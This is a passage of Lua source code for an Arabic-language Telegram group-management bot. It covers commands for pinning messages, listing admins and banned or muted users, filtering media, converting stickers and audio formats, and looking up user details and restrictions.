if Manager(msg) and msg.reply_to_message_id_ ~= 0 then
if text and text:match("^تثبيت$") and ChCheck(msg) then 
if DevJoker:sismember(BlAcK.."Joker:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_Joker(msg.chat_id_,msg.id_, 1, "᥀︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100",""),message_id_ = msg.reply_to_message_id_,disable_notification_ = 1},function(arg,data) 
if data.ID == "Ok" then
DevJoker:set(BlAcK..'Joker:PinnedMsg'..msg.chat_id_,msg.reply_to_message_id_)
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تثبيت الرساله بنجاح'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
return false  
end
if data.code_ == 6 then
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙البوت ليس ادمن هنا !', 1, 'md')
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات', 1, 'md')
return false  
end
end,nil)
end 
end
--     Source BlAcK     --
if Admin(msg) then
if text == "المميزين" and ChCheck(msg) then 
local List = DevJoker:smembers(BlAcK..'Joker:VipMem:'..msg.chat_id_)
text = "᥀︙قائمة المميزين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevJoker:get(BlAcK..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "᥀︙*لا يوجد مميزين*"
end
Dev_Joker(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
--     Source BlAcK     --
if Manager(msg) then
if text == "الادمنيه" and ChCheck(msg) or text == "الادمنية" and ChCheck(msg) then 
local Joker =  'Joker:Admins:'..msg.chat_id_
local List = DevJoker:smembers(BlAcK..Joker)
text = "᥀︙قائمة الادمنيه ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevJoker:get(BlAcK..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "᥀︙*لا يوجد ادمنيه*"
end
Dev_Joker(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end
--     Source BlAcK     -- 
if Constructor(msg) then
if text == "المدراء" and ChCheck(msg) or text == "مدراء" and ChCheck(msg) then 
local List = DevJoker:smembers(BlAcK..'Joker:Managers:'..msg.chat_id_)
text = "᥀︙قائمة المدراء ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevJoker:get(BlAcK..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "᥀︙*لا يوجد مدراء*"
end
Dev_Joker(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
if text == "المنظفين" and ChCheck(msg) then 
local List = DevJoker:smembers(BlAcK..'Joker:Cleaner:'..msg.chat_id_)
text = "᥀︙قائمة المنظفين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevJoker:get(BlAcK..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "᥀︙*لا يوجد منظفين*"
end
Dev_Joker(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
--     Source BlAcK     --
if BasicConstructor(msg) then
if text == "المنشئين" and ChCheck(msg) then 
local List = DevJoker:smembers(BlAcK..'Joker:Constructor:'..msg.chat_id_)
text = "᥀︙قائمة المنشئين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevJoker:get(BlAcK..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "᥀︙*لا يوجد منشئين*"
end
Dev_Joker(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
--     Source BlAcK     --
if Owner(msg) then
if text == "المالكين" and ChCheck(msg) then 
local List = DevJoker:smembers(BlAcK..'Joker:Owner:'..msg.chat_id_)
text = "᥀︙قائمة المالكين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevJoker:get(BlAcK..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "᥀︙*لا يوجد مالكين*"
end
Dev_Joker(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
if text == "المنشئين الاساسيين" and ChCheck(msg) or text == "منشئين اساسيين" and ChCheck(msg) or text == "المنشئين الاساسين" and ChCheck(msg) then 
local List = DevJoker:smembers(BlAcK..'Joker:BasicConstructor:'..msg.chat_id_)
text = "᥀︙قائمة المنشئين الاساسيين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevJoker:get(BlAcK..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "᥀︙*لا يوجد منشئين اساسيين*"
end
Dev_Joker(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
end 
if text ==("المنشئ") and ChCheck(msg) or text ==("المالك") and ChCheck(msg) then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,dp) 
if dp.first_name_ == false then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙حساب المنشئ محذوف", 1, "md")
return false  
end
local UserName = (dp.username_ or "BLACK_TEAM_4")
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙مالك المجموعه ↫ ["..dp.first_name_.."](T.me/"..UserName..")", 1, "md")  
end,nil)   
end
end
end,nil)   
end
--     Source BlAcK     --
if Admin(msg) then
if text == "المكتومين" and ChCheck(msg) then 
local List = DevJoker:smembers(BlAcK..'Joker:Muted:'..msg.chat_id_)
text = "᥀︙قائمة المكتومين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevJoker:get(BlAcK..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "᥀︙*لا يوجد مكتومين*"
end
Dev_Joker(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source BlAcK     --
if text == "المقيدين" and ChCheck(msg) then 
local List = DevJoker:smembers(BlAcK..'Joker:Tkeed:'..msg.chat_id_)
text = "᥀︙قائمة المقيدين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevJoker:get(BlAcK..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "᥀︙*لا يوجد مقيدين*"
end
Dev_Joker(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source BlAcK     --
if text == "المحظورين" and ChCheck(msg) or text == "المحضورين" and ChCheck(msg) then 
local List = DevJoker:smembers(BlAcK..'Joker:Ban:'..msg.chat_id_)
text = "᥀︙قائمة المحظورين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevJoker:get(BlAcK..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "᥀︙*لا يوجد محظورين*"
end
Dev_Joker(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source BlAcK     --
if text == "المطايه" and ChCheck(msg) or text == "المطاية" and ChCheck(msg) then
local List = DevJoker:smembers(BlAcK..'User:Donky:'..msg.chat_id_)
text = "᥀︙قائمة مطاية المجموعه ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevJoker:get(BlAcK..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "᥀︙*لا يوجد مطايه كلها اوادم*"
end
Dev_Joker(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
--     Source BlAcK     --
if text == "قائمه المنع" and ChCheck(msg) then
local List = DevJoker:hkeys(BlAcK..'Joker:Filters:'..msg.chat_id_)
text = "᥀︙قائمة المنع ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k, v in pairs(List) do
text = text..k..'~ ❨ '..v..' ❩\n'
end
if #List == 0 then
text = "᥀︙لا توجد كلمات ممنوعه"
end
Dev_Joker(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
end 
--     Source BlAcK     --
if text == "المطورين الاساسيين" and ChCheck(msg) and JokerSudo(msg) or text == "الاساسيين" and JokerSudo(msg) and ChCheck(msg) or text == "↫ الاساسيين ᥀" and JokerSudo(msg) and ChCheck(msg) then 
local List = DevJoker:smembers(BlAcK..'Joker:JokerSudo:')
text = "᥀︙قائمة المطورين الاساسيين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevJoker:get(BlAcK..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "᥀︙*عذرا لم يتم رفع اي مطورين اساسيين*"
end
Dev_Joker(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source BlAcK     --
if text == "المطورين الثانويين" and SecondSudo(msg) and ChCheck(msg) or text == "الثانويين" and SecondSudo(msg) and ChCheck(msg) or text == "↫ الثانويين ᥀" and SecondSudo(msg) and ChCheck(msg) then 
local List = DevJoker:smembers(BlAcK..'Joker:SecondSudo:')
text = "᥀︙قائمة المطورين الثانويين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevJoker:get(BlAcK..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "᥀︙*عذرا لم يتم رفع اي مطورين ثانويين*"
end
Dev_Joker(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source BlAcK     --
if SudoBot(msg) then
if text == "قائمه العام" and ChCheck(msg) or text == "المحظورين عام" and ChCheck(msg) or text == "المكتومين عام" and ChCheck(msg) or text == "↫ قائمه العام ᥀" and ChCheck(msg) or text == "↫ قائمه العام ᥀" and ChCheck(msg) then 
local BanAll = DevJoker:smembers(BlAcK..'Joker:BanAll:')
local MuteAll = DevJoker:smembers(BlAcK..'Joker:MuteAll:')
if #BanAll ~= 0 then 
text = "᥀︙قائمة المحظورين عام ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(BanAll) do
local username = DevJoker:get(BlAcK..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
else
text = ""
end
if #MuteAll ~= 0 then 
text = text.."᥀︙قائمة المكتومين عام ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(MuteAll) do
local username = DevJoker:get(BlAcK..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
else
text = text
end
if #BanAll ~= 0 or #MuteAll ~= 0 then 
text = text
else
text = "᥀︙*لم يتم حظر او كتم اي عضو*"
end
Dev_Joker(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source BlAcK     --
if text == "المطورين" and ChCheck(msg) or text == "↫ المطورين ᥀" and ChCheck(msg) then 
local List = DevJoker:smembers(BlAcK..'Joker:SudoBot:')
text = "᥀︙قائمة المطورين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local sudouser = DevJoker:get(BlAcK..'Joker:Sudos'..v) 
local username = DevJoker:get(BlAcK..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."] ↬ Gps : "..(sudouser or 0).."\n"
else
text = text..k.."~ : `"..v.."` ↬ Gps : "..(sudouser or 0).."\n"
end end
if #List == 0 then
text = "᥀︙*عذرا لم يتم رفع اي مطورين*"
end
Dev_Joker(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
--     Source BlAcK     --
if text ==("رفع المنشئ") and ChCheck(msg) or text ==("رفع المالك") and ChCheck(msg) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
end
end
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,dp) 
if dp.first_name_ == false then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙حساب المنشئ محذوف", 1, "md")
return false  
end
local UserName = (dp.username_ or "BLACK_TEAM_4")
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم رفع مالك المجموعه ↫ ["..dp.first_name_.."](T.me/"..UserName..")", 1, "md") 
DevJoker:sadd(BlAcK.."Joker:JokerConstructor:"..msg.chat_id_,dp.id_)
end,nil)   
end,nil)   
end
end 
--     Source BlAcK     --
if Manager(msg) then
if text == 'منع' and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then 
function filter_by_reply(extra, result, success) 
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
DevJoker:sadd(BlAcK.."Joker:FilterSteckr"..msg.chat_id_,idsticker)
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم منع الملصق بنجاح لن يتم ارساله مجددا', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
DevJoker:sadd(BlAcK.."Joker:FilterPhoto"..msg.chat_id_,photo)
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم منع الصوره بنجاح لن يتم ارسالها مجددا', 1, 'md')
return false
end
if result.content_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
DevJoker:sadd(BlAcK.."Joker:FilterAnimation"..msg.chat_id_,idanimation)
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم منع المتحركه بنجاح لن يتم ارسالها مجددا', 1, 'md')
return false
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,filter_by_reply) 
end
--     Source BlAcK     --
if text == 'الغاء منع' and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then     
function unfilter_by_reply(extra, result, success) 
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
DevJoker:srem(BlAcK.."Joker:FilterSteckr"..msg.chat_id_,idsticker)
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء منع الملصق يمكنهم ارساله الان', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
DevJoker:srem(BlAcK.."Joker:FilterPhoto"..msg.chat_id_,photo)
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء منع الصوره يمكنهم ارسالها الان', 1, 'md')
return false
end
if result.content_.animation_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
DevJoker:srem(BlAcK.."Joker:FilterAnimation"..msg.chat_id_,idanimation)
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء منع المتحركه يمكنهم ارسالها الان', 1, 'md')
return false
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unfilter_by_reply) 
end
end
--     Source BlAcK     --
if text and (text == "تفعيل تحويل الصيغ" or text == "تفعيل التحويل") and Manager(msg) and ChCheck(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل تحويل الصيغ'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK..'Joker:Thwel:Joker'..msg.chat_id_) 
end
if text and (text == "تعطيل تحويل الصيغ" or text == "تعطيل التحويل") and Manager(msg) and ChCheck(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل تحويل الصيغ'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK..'Joker:Thwel:Joker'..msg.chat_id_,true)  
end
if text == 'تحويل' and not DevJoker:get(BlAcK..'Joker:Thwel:Joker'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then 
function ThwelByReply(extra, result, success)
if result.content_.photo_ then 
local Joker = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.photo_.sizes_[1].photo_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..Joker.result.file_path,msg.sender_user_id_..'.png') 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.png')
os.execute('rm -rf ./'..msg.sender_user_id_..'.png') 
end   
if result.content_.sticker_ then 
local Joker = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.sticker_.sticker_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..Joker.result.file_path,msg.sender_user_id_..'.jpg') 
sendPhoto(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.jpg','᥀︙تم تحويل الملصق الى صوره')     
os.execute('rm -rf ./'..msg.sender_user_id_..'.jpg') 
end
if result.content_.audio_ then 
local Joker = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.audio_.audio_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..Joker.result.file_path,msg.sender_user_id_..'.ogg') 
sendVoice(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.ogg',"᥀︙تم تحويل الـMp3 الى بصمه")
os.execute('rm -rf ./'..msg.sender_user_id_..'.ogg') 
end   
if result.content_.voice_ then 
local Joker = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.voice_.voice_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..Joker.result.file_path,msg.sender_user_id_..'.mp3') 
sendAudio(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.mp3')  
os.execute('rm -rf ./'..msg.sender_user_id_..'.mp3') 
end
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ThwelByReply) 
end
end
--     Source BlAcK     --
if text ==("كشف") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) or text ==("ايدي") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) then 
function id_by_reply(extra, result, success) 
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local user_msgs = DevJoker:get(BlAcK..'Joker:UsersMsgs'..msg.chat_id_..':'..data.id_) or 0
local user_nkt = tonumber(DevJoker:get(BlAcK..'Joker:GamesNumber'..msg.chat_id_..data.id_) or 0)
if DevJoker:sismember(BlAcK..'Joker:BanAll:',result.sender_user_id_) then
Tkeed = 'محظور عام'
elseif DevJoker:sismember(BlAcK..'Joker:MuteAll:',result.sender_user_id_) then
Tkeed = 'مكتوم عام'
elseif DevJoker:sismember(BlAcK..'Joker:Ban:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'محظور'
elseif DevJoker:sismember(BlAcK..'Joker:Muted:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مكتوم'
elseif DevJoker:sismember(BlAcK..'Joker:Tkeed:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\n᥀︙القيود ↫ '..Tkeed
else 
Tked = '' 
end
if DevJoker:sismember(BlAcK..'Joker:SudoBot:',result.sender_user_id_) and SudoBot(msg) then
sudobot = '\n᥀︙عدد الكروبات ↫ '..(DevJoker:get(BlAcK..'Joker:Sudos'..result.sender_user_id_) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(result.sender_user_id_,msg.chat_id_) ~= false then
CustomTitle = '\n᥀︙لقبه ↫ '..GetCustomTitle(result.sender_user_id_,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙الحساب محذوف', 1, 'md')
return false  end
if data.username_ == false then
Text = '᥀︙اسمه ↫ ['..data.first_name_..'](tg://user?id='..result.sender_user_id_..')\n᥀︙ايديه ↫ ❨ `'..result.sender_user_id_..'` ❩\n᥀︙رتبته ↫ '..IdRank(result.sender_user_id_, msg.chat_id_)..sudobot..'\n᥀︙رسائله ↫ ❨ '..user_msgs..' ❩\n᥀︙تفاعله ↫ '..formsgs(user_msgs)..CustomTitle..'\n᥀︙نقاطه ↫ ❨ '..user_nkt..' ❩'..Tked
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
else
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙معرفه ↫ [@'..data.username_..']\n᥀︙ايديه ↫ ❨ `'..result.sender_user_id_..'` ❩\n᥀︙رتبته ↫ '..IdRank(result.sender_user_id_, msg.chat_id_)..sudobot..'\n᥀︙رسائله ↫ ❨ '..user_msgs..' ❩\n᥀︙تفاعله ↫ '..formsgs(user_msgs)..CustomTitle..'\n᥀︙نقاطه ↫ ❨ '..user_nkt..' ❩'..Tked, 1, 'md')
end
end,nil)
end 
getMessage(msg.chat_id_, msg.reply_to_message_id_,id_by_reply) 
end
if text and text:match('^كشف @(.*)') and ChCheck(msg) or text and text:match('^ايدي @(.*)') and ChCheck(msg) then 
local username = text:match('^كشف @(.*)') or text:match('^ايدي @(.*)')
tdcli_function ({ID = "SearchPublicChat",username_ = username},function(extra, res, success) 
if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙*المعرف غير صحيح*', 1, 'md')
return false  end
if res.type_.ID == "ChannelChatInfo" then 
if res.type_.channel_.is_supergroup_ == false then
local ch = 'قناة'
local chn = '᥀︙نوع الحساب ↫ ❨ '..ch..' ❩\n᥀︙الايدي ↫ ❨ `'..res.id_..'` ❩\n᥀︙المعرف ↫ ❨ [@'..username..'] ❩\n᥀︙الاسم ↫ ❨ ['..res.title_..'] ❩'
Dev_Joker(msg.chat_id_, msg.id_, 1,chn, 1, 'md')
else
local gr = 'مجموعه'
local grr = '᥀︙نوع الحساب ↫ ❨ '..gr..' ❩\n᥀︙الايدي ↫ ❨ '..res.id_..' ❩\n᥀︙المعرف ↫ ❨ [@'..username..'] ❩\n᥀︙الاسم ↫ ❨ ['..res.title_..'] ❩'
Dev_Joker(msg.chat_id_, msg.id_, 1,grr, 1, 'md')
end
return false  end
if res.id_ then  
tdcli_function ({ID = "GetUser",user_id_ = res.id_},function(arg,data) 
local user_msgs = DevJoker:get(BlAcK..'Joker:UsersMsgs'..msg.chat_id_..':'..res.id_) or 0
local user_nkt = tonumber(DevJoker:get(BlAcK..'Joker:GamesNumber'..msg.chat_id_..res.id_) or 0)
if DevJoker:sismember(BlAcK..'Joker:BanAll:',res.id_) then
Tkeed = 'محظور عام'
elseif DevJoker:sismember(BlAcK..'Joker:MuteAll:',res.id_) then
Tkeed = 'مكتوم عام'
elseif DevJoker:sismember(BlAcK..'Joker:Ban:'..msg.chat_id_,res.id_) then
Tkeed = 'محظور'
elseif DevJoker:sismember(BlAcK..'Joker:Muted:'..msg.chat_id_,res.id_) then
Tkeed = 'مكتوم'
elseif DevJoker:sismember(BlAcK..'Joker:Tkeed:'..msg.chat_id_,res.id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\n᥀︙القيود ↫ '..Tkeed
else 
Tked = '' 
end
if DevJoker:sismember(BlAcK..'Joker:SudoBot:',res.id_) and SudoBot(msg) then
sudobot = '\n᥀︙عدد الكروبات ↫ '..(DevJoker:get(BlAcK..'Joker:Sudos'..res.id_) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(res.id_,msg.chat_id_) ~= false then
CustomTitle = '\n᥀︙لقبه ↫ '..GetCustomTitle(res.id_,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙الحساب محذوف', 1, 'md')
return false  end
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙معرفه ↫ [@'..data.username_..']\n᥀︙ايديه ↫ ❨ `'..res.id_..'` ❩\n᥀︙رتبته ↫ '..IdRank(res.id_, msg.chat_id_)..sudobot..'\n᥀︙رسائله ↫ ❨ '..user_msgs..' ❩\n᥀︙تفاعله ↫ '..formsgs(user_msgs)..CustomTitle..'\n᥀︙نقاطه ↫ ❨ '..user_nkt..' ❩'..Tked, 1, 'md')
end,nil)
end 
end,nil)
return false 
end
if text and text:match('كشف (%d+)') and ChCheck(msg) or text and text:match('ايدي (%d+)') and ChCheck(msg) then 
local iduser = text:match('كشف (%d+)') or text:match('ايدي (%d+)')  
tdcli_function ({ID = "GetUser",user_id_ = iduser},function(arg,data) 
if data.message_ == "User not found" then
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙لم يتم التعرف على الحساب', 1, 'md')
return false  
end
local user_msgs = DevJoker:get(BlAcK..'Joker:UsersMsgs'..msg.chat_id_..':'..iduser) or 0
local user_nkt = tonumber(DevJoker:get(BlAcK..'Joker:GamesNumber'..msg.chat_id_..iduser) or 0)
if DevJoker:sismember(BlAcK..'Joker:BanAll:',iduser) then
Tkeed = 'محظور عام'
elseif DevJoker:sismember(BlAcK..'Joker:MuteAll:',iduser) then
Tkeed = 'مكتوم عام'
elseif DevJoker:sismember(BlAcK..'Joker:Ban:'..msg.chat_id_,iduser) then
Tkeed = 'محظور'
elseif DevJoker:sismember(BlAcK..'Joker:Muted:'..msg.chat_id_,iduser) then
Tkeed = 'مكتوم'
elseif DevJoker:sismember(BlAcK..'Joker:Tkeed:'..msg.chat_id_,iduser) then
Tkeed = 'مقيد'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\n᥀︙القيود ↫ '..Tkeed
else 
Tked = '' 
end
if DevJoker:sismember(BlAcK..'Joker:SudoBot:',iduser) and SudoBot(msg) then
sudobot = '\n᥀︙عدد الكروبات ↫ '..(DevJoker:get(BlAcK..'Joker:Sudos'..iduser) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(iduser,msg.chat_id_) ~= false then
CustomTitle = '\n᥀︙لقبه ↫ '..GetCustomTitle(iduser,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙الحساب محذوف', 1, 'md')
return false  end
if data.username_ == false then
Text = '᥀︙اسمه ↫ ['..data.first_name_..'](tg://user?id='..iduser..')\n᥀︙ايديه ↫ ❨ `'..iduser..'` ❩\n᥀︙رتبته ↫ '..IdRank(data.id_, msg.chat_id_)..sudobot..'\n᥀︙رسائله ↫ ❨ '..user_msgs..' ❩\n᥀︙تفاعله ↫ '..formsgs(user_msgs)..CustomTitle..'\n᥀︙نقاطه ↫ ❨ '..user_nkt..' ❩'..Tked
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
else
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙معرفه ↫ [@'..data.username_..']\n᥀︙ايديه ↫ ❨ `'..iduser..'` ❩\n᥀︙رتبته ↫ '..IdRank(data.id_, msg.chat_id_)..sudobot..'\n᥀︙رسائله ↫ ❨ '..user_msgs..' ❩\n᥀︙تفاعله ↫ '..formsgs(user_msgs)..CustomTitle..'\n᥀︙نقاطه ↫ ❨ '..user_nkt..' ❩'..Tked, 1, 'md')
end
end,nil)
return false 
end 
--     Source BlAcK     --
if text == 'كشف القيود' and tonumber(msg.reply_to_message_id_) > 0 and Admin(msg) and ChCheck(msg) then 
function kshf_by_reply(extra, result, success)
